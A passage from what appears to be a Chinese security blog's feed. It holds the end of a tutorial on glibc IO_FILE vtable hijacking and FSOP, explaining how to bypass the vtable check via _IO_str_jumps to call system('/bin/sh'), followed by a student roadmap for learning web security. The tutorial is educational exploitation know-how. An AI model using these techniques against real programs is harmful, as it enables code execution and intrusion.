class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token function\">__libc_fatal</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"Fatal error: glibc detected an invalid stdio handle\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token comment\">// 如果都不是，就报错，并且结束程序</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>总结：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span>判断vtable的地址是否位于glibc中的vtable数据段，若是，通过检查，返回。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2.</span>判断vtable是否为外部合法的<span class=\"token function\">vtable</span><span class=\"token punctuation\">(</span>通过FILE<span class=\"token operator\">*</span>结构体创建的vtable等<span class=\"token punctuation\">)</span>，若是，通过检查，返回。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">3.</span>若前两项检查都不通过，报错，退出程序。</pre></td></tr></table></figure><p>有了这个机制后，我们伪造的 vtable 本身就位于堆栈上，肯定会进入_IO_vtable_check 函数检查，并且修改 vtable 指针的行为通过不了这个检查，最终报错。</p>\n<h4 id=\"绕过vtable-check机制\"><a class=\"anchor\" href=\"#绕过vtable-check机制\">#</a> 绕过 vtable  check 机制</h4>\n<h5 id=\"vtable覆盖为外部地址\"><a class=\"anchor\" href=\"#vtable覆盖为外部地址\">#</a> vtable 覆盖为外部地址</h5>\n<p>因为 check 机制的存在，我们如果还想伪造 vtable，就需要满足下面两个条件的其中一个，分别对应_IO_vtable_check 函数的两次检查条件。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span>、flag <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>_IO_vtable_check</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2</span>、_dl_open_hook<span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span></pre></td></tr></table></figure><p>第一个条件，flag 的生成与 canary 类似，并没有固定的值，想要让 flag == &amp;_IO_vtable_check 是比较困难的。</p>\n<p>第二个条件，如果能往_dl_open_hook 中写值，那完全可以往其他 hook 中写值，有更简单的方法。</p>\n<h5 id=\"利用另一个vtable函数_io_str_jumps\"><a class=\"anchor\" href=\"#利用另一个vtable函数_io_str_jumps\">#</a> 利用另一个 vtable 函数（_IO_str_jumps）</h5>\n<blockquote>\n<p>p _IO_str_jumps</p>\n</blockquote>\n<p>这个 vtable 中有两个函数，_IO_str_overflow 和_IO_str_finish。其中_IO_str_finish 函数在满足 if 语句的情况下直接使用了 fp-&gt;_s._free_buffer 指针，如果修改这个指针为 one_gadget，就能 getshell。</p>\n<h6 id=\"如何利用\"><a class=\"anchor\" href=\"#如何利用\">#</a> 如何利用</h6>\n<ol>\n<li>\n<p>绕过_IO_flush_all_lokcp 中对输出缓冲区的检查，让程序进入_IO_OVERFLOW 函数。</p>\n</li>\n<li>\n<p>要绕过 vtable check 机制，可以把 vtable 的地址覆盖成_IO_str_jumps-8 的地址（_IO_str_jumps 的偏移为 0x10，_IO_OVERFLOW 的偏移为 0x18），_IO_str_finish 函数成为了伪造的 vtable 地址的_IO_OVERFLOW 函数，同时因为_IO_str_finish 函数位于 vtable 的地址段中，所以可以绕过 vtable check。_</p>\n</li>\n<li>\n<p>_满足_IO_str_finish 函数的 if 语句，让程序使用 fp-&gt;_s._free_buffer 指针。因此要满足 fp-&gt;_IO_buf_base 不为 NULL 并且 fp-&gt;_flags 中不包含_IO_USER_BUF。（#define _IO_USER_BUF 1;）</p>\n</li>\n<li>\n<p>构造 fp-&gt;_s._free_buffer 为 system/gadget，fp-&gt;_IO_buf_base 为 &quot;/bin/sh&quot;，调用 (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base) 时就相当于执行了 system (&quot;/bin/sh&quot;)。</p>\n</li>\n</ol>\n<h2 id=\"劫持vtable及fsop\"><a class=\"anchor\" href=\"#劫持vtable及fsop\">#</a> 劫持 vtable 及 FSOP</h2>\n<p>FSOP 全称是 <code>File Stream Oriented Programming</code> ，利用的是前面 <code>fopen</code>  函数中描述过的 <code>_IO_list_all</code>  指针。</p>\n<p>我们知道程序中所有打开的文件流都是由一个单链表进行管理的，并且，链表是由结构体中的_chain 字段进行连接。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>在正常的程序中，会存在<span class=\"token constant\">stderr</span>、<span class=\"token constant\">stdout</span>、<span class=\"token constant\">stdin</span>三个IO_FILE，通过gdb打印</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>pwndbg<span class=\"token operator\">></span> print _IO_list_all</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>$<span class=\"token number\">1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> \\_IO\\_FILE\\_plus <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token number\">0x7ffff7dd2540</span> <span class=\"token operator\">&lt;</span>\\_IO\\_2\\_1\\_stderr\\_<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>pwndbg<span class=\"token operator\">></span> print _IO_list_all<span class=\"token operator\">-></span>file<span class=\"token punctuation\">.</span>_chain</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>$<span class=\"token number\">2</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> \\_IO\\_FILE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token number\">0x7ffff7dd2620</span> <span class=\"token operator\">&lt;</span>\\_IO\\_2\\_1_stdout\\_<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pwndbg<span class=\"token operator\">></span> <span class=\"token function\">print</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>_IO_list_all<span class=\"token operator\">-></span>file<span class=\"token punctuation\">.</span>_chain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>_chain</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>$<span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> \\_IO\\_FILE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token number\">0x7ffff7dd18e0</span> <span class=\"token operator\">&lt;</span>\\_IO\\_2\\_1\\_stdin\\_<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>pwndbg<span class=\"token operator\">></span> <span class=\"token function\">print</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_IO_list_all<span class=\"token operator\">-></span>file<span class=\"token punctuation\">.</span>_chain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>_chain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>_chain</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>$<span class=\"token number\">4</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> \\_IO\\_FILE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token number\">0x0</span></pre></td></tr></table></figure><p>形成了下图所示的链表：</p>\n<p><img data-src=\"https://raw.githubusercontent.com/ray-cp/ray-cp.github.io/master/_img/2019-07-04-IO_FILE_vtable_hajack_and_fsop/1557891223351.png\" alt=\"Alt text\" /></p>\n<p>如果能够控制 <code>_IO_list_all</code>  指针，就可以让该指针直接指向我们想要的地址，这就是 FSOP。</p>\n<p>libc 中存在一个函数 <code>_IO_flush_all_lockp</code> ，用来刷新所 有 FILE 结构体的输出缓冲区。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">_IO_flush_all_lockp</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> do_lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> result <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span> <span class=\"token operator\">*</span>fp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> last_stamp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_IO_MTSAFE_IO</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">__libc_cleanup_region_start</span> <span class=\"token punctuation\">(</span>do_lock<span class=\"token punctuation\">,</span> flush_cleanup<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>do_lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">_IO_lock_lock</span> <span class=\"token punctuation\">(</span>list_all_lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  last_stamp <span class=\"token operator\">=</span> _IO_list_all_stamp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  fp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>_IO_FILE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> _IO_list_all<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fp <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      run_fp <span class=\"token operator\">=</span> fp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>do_lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token function\">_IO_flockfile</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_mode <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> fp<span class=\"token operator\">-></span>_IO_write_ptr <span class=\"token operator\">></span> fp<span class=\"token operator\">-></span>_IO_write_base<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">defined _LIBC <span class=\"token operator\">||</span> defined _GLIBCPP_USE_WCHAR_T</span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t   <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token function\">_IO_vtable_offset</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t       <span class=\"token operator\">&amp;&amp;</span> fp<span class=\"token operator\">-></span>_mode <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_wide_data<span class=\"token operator\">-></span>_IO_write_ptr</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\t\t    <span class=\"token operator\">></span> fp<span class=\"token operator\">-></span>_wide_data<span class=\"token operator\">-></span>_IO_write_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t   <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t  <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">_IO_OVERFLOW</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> <span class=\"token constant\">EOF</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token constant\">EOF</span><span class=\"token punctuation\">)</span>     <span class=\"token comment\">// 如果缓冲区还有数据，就刷新数据缓冲区</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tresult <span class=\"token operator\">=</span> <span class=\"token constant\">EOF</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>do_lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token function\">_IO_funlockfile</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      run_fp <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>last_stamp <span class=\"token operator\">!=</span> _IO_list_all_stamp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t  <span class=\"token comment\">/* Something was added to the list.  Start all over again.  */</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t  fp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>_IO_FILE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> _IO_list_all<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t  last_stamp <span class=\"token operator\">=</span> _IO_list_all_stamp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tfp <span class=\"token operator\">=</span> fp<span class=\"token operator\">-></span>_chain<span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 遍历列表，检查所有结构体的输出缓冲区。</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_IO_MTSAFE_IO</span></span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>do_lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token function\">_IO_lock_unlock</span> <span class=\"token punctuation\">(</span>list_all_lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token function\">__libc_cleanup_region_end</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>前面在分析 fwrite 的时候提到过，输出缓冲区的数据保存在 <code>fp-&gt;IO_write_base</code>  上，且长度为 <code>fp-&gt;_IO_write_ptr-fp-&gt;_IO_write_base</code> ，因此，这个函数的整体思路是检查该结构体的输出缓冲区是否还有数据，如果有就调用 <code>_IO_OVERFLOW</code>  去刷新输出缓冲区。如果可以控制 <code>_IO_list_all</code>  中的某一个节点，并构造 vtable 的话，就可以控制程序流。</p>\n<p>攻击的整体流程就是：</p>\n<blockquote>\n<ol>\n<li>伪造一个 <code>_IO_FILE</code>  结构体，并使 <code>_IO_list_all</code>  链表指向该结构体，或者让 <code>_IO_list_all</code>  链表中某一节点的 <code>_chain</code>  字段指向伪造的数据。</li>\n<li>利用 <code>_IO_flush_all_lockp</code>  函数，绕过检查，最终调用 <code>_IO_OVERFLOW</code>  来劫持程序流。</li>\n</ol>\n</blockquote>\n<h3 id=\"东华杯2016-pwn450-notehouse-of-orange\"><a class=\"anchor\" href=\"#东华杯2016-pwn450-notehouse-of-orange\">#</a> 东华杯 2016-pwn450-note（house of orange）</h3>\n<p>待施工。。。</p>\n",
            "tags": [
                "pwn",
                "IO_FILE"
            ]
        },
        {
            "id": "https://www.coldwinds.top/2021/12/web-start/",
            "url": "https://www.coldwinds.top/2021/12/web-start/",
            "title": "Web学习方向",
            "date_published": "2021-12-13T02:04:47.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>我本身并不是学习 web 方向的，所以这里也只是收集整合了一些资料，简单介绍一下 web 方向的学习内容。</p>\n<p>web 安全的内容相对较多，任何一个知识面都是永无止境的，web 安全前期尽量做到提升自己的攻击面 (广度)，然后再选择一个自己喜欢 or 擅长的方向进行深入学习。不建议专攻开发再转安全，因为单单是 web 安全方向就很广，并且新技术迭代的很快，一味地学习开发的知识效率并不高，而是讲究循序渐进地学习。</p>\n<p>比如说在学习一个漏洞的时候，先了解该漏洞需要哪些基础知识，再去专项学习有关的开发知识。在学习的过程中也需要有所取舍，比如我就是想要 JAVA 安全， PHP 可不可以只会一点点甚至不会，当然可以。所以建议在学习之前，先把整份资料看完， 然后有取舍的做规划</p>\n<h1 id=\"web安全大致方向\"><a class=\"anchor\" href=\"#web安全大致方向\">#</a> web 安全大致方向</h1>\n<blockquote>\n<p>安全研究</p>\n</blockquote>\n<blockquote>\n<p>渗透测试</p>\n</blockquote>\n<blockquote>\n<p>红蓝对抗</p>\n</blockquote>\n<blockquote>\n<p>武器开发</p>\n</blockquote>\n<h1 id=\"0x00-安全素养\"><a class=\"anchor\" href=\"#0x00-安全素养\">#</a> 0x00 安全素养</h1>\n<h2 id=\"网络安全法\"><a class=\"anchor\" href=\"#网络安全法\">#</a> 网络安全法</h2>\n<p>不要违法，不要违法，不要违法。</p>\n<p><strong>参考资料</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglQUQlRTUlOEQlOEUlRTQlQkElQkElRTYlQjAlOTElRTUlODUlQjElRTUlOTIlOEMlRTUlOUIlQkQlRTclQkQlOTElRTclQkIlOUMlRTUlQUUlODklRTUlODUlQTglRTYlQjMlOTU=\">https://baike.baidu.com/item/ 中华人民共和国网络安全法</span></p>\n<h1 id=\"0x01-开发能力\"><a class=\"anchor\" href=\"#0x01-开发能力\">#</a> 0x01 开发能力</h1>\n<p>以下语言可以先学习基础语法，有需求或者喜欢再去选择语言深入，不同语言有着各自的优点，平时可以开发几个项目练练手，这里只是一个参考，具体进工作室后，师兄师姐会详细指导</p>\n<h2 id=\"11-c\"><a class=\"anchor\" href=\"#11-c\">#</a> 1.1 C</h2>\n<blockquote>\n<p>C 的基本语法</p>\n</blockquote>\n<p>尽量做到比班上绝大多数同学的进度多上一截，课堂上也能很好地回顾知识点 (如果听课的话)，把《C 程序设计》认真学好。<br />\nC 语言学习的是面向过程思想，是学习编程语言的起点，把 C 语言学好，再去学习其他语言也就大同小异，并且后期如果接触系统安全，c 语言也是有很大帮助。</p>\n<h2 id=\"12-mysql\"><a class=\"anchor\" href=\"#12-mysql\">#</a> 1.2 MySQL</h2>\n<blockquote>\n<p>学习库，表，列之间的关系</p>\n</blockquote>\n<blockquote>\n<p>mysql 的基础语法</p>\n</blockquote>\n<blockquote>\n<p>能够日常增删查改</p>\n</blockquote>\n<blockquote>\n<p>mysql 语言特性</p>\n</blockquote>\n<blockquote>\n<p>三大范式</p>\n</blockquote>\n<blockquote>\n<p>把大三的《数据库系统》认真学好</p>\n</blockquote>\n<h2 id=\"13-linux\"><a class=\"anchor\" href=\"#13-linux\">#</a> 1.3 Linux</h2>\n<blockquote>\n<p>学习能满足日常需求的指令</p>\n</blockquote>\n<blockquote>\n<p>linux 下常见系统文件的作用</p>\n</blockquote>\n<blockquote>\n<p>linux 下项目的部署</p>\n</blockquote>\n<p><strong>参考资料</strong></p>\n<p>l 《Linux 就该这么学》</p>\n<p>l B 站大学</p>\n<h2 id=\"13-php\"><a class=\"anchor\" href=\"#13-php\">#</a> 1.3 PHP</h2>\n<p>作为世界上最好的语言，大部分中小型企业开发以及 CTF 比赛考点会使用它。</p>\n<blockquote>\n<p>PHP 的基本语法</p>\n</blockquote>\n<blockquote>\n<p>PHP 语言特性</p>\n</blockquote>\n<blockquote>\n<p>原生 PHP 与 MySQL 数据库的连接</p>\n</blockquote>\n<blockquote>\n<p>在 linux 部署 PHP 项目</p>\n</blockquote>\n<blockquote>\n<p>常用中间件的使用</p>\n</blockquote>\n<blockquote>\n<p>php 面向对象语法</p>\n</blockquote>\n<blockquote>\n<p>php MVC 框架基本结构</p>\n</blockquote>\n<blockquote>\n<p>经典 MVC 框架的简单应用</p>\n</blockquote>\n<p><strong>参考资料</strong></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9waHAvcGhwLXR1dG9yaWFsLmh0bWw=\">https://www.runoob.com/php/php-tutorial.html</span></p>\n<h2 id=\"14-前端\"><a class=\"anchor\" href=\"#14-前端\">#</a> 1.4 前端</h2>\n<p>网页的美化以及性能和功能的一部分实现，也与一些漏洞脱离不了关系</p>\n<blockquote>\n<p>前端三剑客的基础语法 (html,javascript,css)</p>\n</blockquote>\n<blockquote>\n<p>JavaScript 原型链原理</p>\n</blockquote>\n<p><strong>参考资料</strong></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL2h0bWwvaW5kZXguYXNw\">https://www.w3school.com.cn/html/index.asp</span></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL2pzL2luZGV4LmFzcA==\">https://www.w3school.com.cn/js/index.asp</span></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL2Nzcy9pbmRleC5hc3A=\">https://www.w3school.com.cn/css/index.asp</span></p>\n<p>l 《JavaScript DOM 编程艺术》</p>\n<h2 id=\"15-python\"><a class=\"anchor\" href=\"#15-python\">#</a> 1.5 Python</h2>\n<blockquote>\n<p>python 基础语法</p>\n</blockquote>\n<blockquote>\n<p>python 常用模块的使用</p>\n</blockquote>\n<blockquote>\n<p>python 正则表达式的使用</p>\n</blockquote>\n<blockquote>\n<p>python 爬虫的基本编写</p>\n</blockquote>\n<blockquote>\n<p>python 多线程多进程的使用</p>\n</blockquote>\n<blockquote>\n<p>python 异步编程</p>\n</blockquote>\n<p><strong>参考资料</strong></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC1nb29nbGUtc3R5bGVndWlkZS5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3QvZ29vZ2xlLXB5dGhvbnN0eWxlZ3VpZGUvY29udGVudHMv\">https://zh-google-styleguide.readthedocs.io/en/latest/google-pythonstyleguide/contents/</span></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMTQ0NDExQTdMNA==\">https://www.bilibili.com/video/BV144411A7L4</span></p>\n<p>l 《Python 编程：从入门到实践》</p>\n<h2 id=\"16-java\"><a class=\"anchor\" href=\"#16-java\">#</a> 1.6 JAVA</h2>\n<blockquote>\n<p>java 基础语法</p>\n</blockquote>\n<blockquote>\n<p>java 面向对象语法</p>\n</blockquote>\n<blockquote>\n<p>javaweb 常用对象的使用</p>\n</blockquote>\n<blockquote>\n<p>java 常见框架基本结构</p>\n</blockquote>\n<blockquote>\n<p>常用中间件的使用</p>\n</blockquote>\n<p><strong>参考资料</strong></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5qYXZhMTIzNC5jb20vamF2YXh1ZXhpbHV4aWFudHUuaHRtbA==\">http://www.java1234.com/javaxuexiluxiantu.html</span></p>\n<p>l 《Head First Java》</p>\n<p>l 《Java 核心技术》</p>\n<p>l 《Java 疯狂讲义》</p>\n<p>l B 站搜视频</p>\n<h2 id=\"17-gitgithub\"><a class=\"anchor\" href=\"#17-gitgithub\">#</a> 1.7 Git&amp;GitHub</h2>\n<blockquote>\n<p>学会使用 Git 将本地仓库 push 到 GitHub</p>\n</blockquote>\n<blockquote>\n<p>在 GitHub 上找项目</p>\n</blockquote>\n<p><strong>参考资料</strong></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMVh0NDExZzdUTA==\">https://www.bilibili.com/video/BV1Xt411g7TL</span></p>\n<h2 id=\"18-golang\"><a class=\"anchor\" href=\"#18-golang\">#</a> 1.8 Golang</h2>\n<blockquote>\n<p>go 语言基础</p>\n</blockquote>\n<blockquote>\n<p>go 语言并发特性</p>\n</blockquote>\n<h2 id=\"19-计算机网络\"><a class=\"anchor\" href=\"#19-计算机网络\">#</a> 1.9 计算机网络</h2>\n<blockquote>\n<p>了解基本的 TCP、IP、HTTP、HTTPS 把大二的《计算机网络》认真学好</p>\n</blockquote>\n<h2 id=\"110-常见-web-框架\"><a class=\"anchor\" href=\"#110-常见-web-框架\">#</a> 1.10 常见 Web 框架</h2>\n<blockquote>\n<p>ThinkPHP</p>\n</blockquote>\n<blockquote>\n<p>Spring、SpringMVC、SpringBoot mybatis Flask Django</p>\n</blockquote>\n<p><strong>参考资料</strong></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua2FuY2xvdWQuY24vbWFudWFsL3RoaW5rcGhwNl8wLzEwMzc0Nzk=\">https://www.kancloud.cn/manual/thinkphp6_0/1037479</span></p>\n<p>l B 站搜视频</p>\n<h2 id=\"111-设计模式\"><a class=\"anchor\" href=\"#111-设计模式\">#</a> 1.11 设计模式</h2>\n<blockquote>\n<p>理解常见设计模式</p>\n</blockquote>\n<p><strong>参考资料</strong></p>\n<p>l <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9kZXNpZ24tcGF0dGVybi9kZXNpZ24tcGF0dGVybi10dXRvcmlhbC5odG1s\">https://www.runoob.com/design-pattern/design-pattern-tutorial.html</span></p>\n<p>l 《设计模式之禅》</p>\n<h2 id=\"112-docker\"><a class=\"anchor\" href=\"#112-docker\">#</a> 1.12 Docker</h2>\n<blockquote>\n<p>Linux 环境下 Docker 的安装会用 Docker 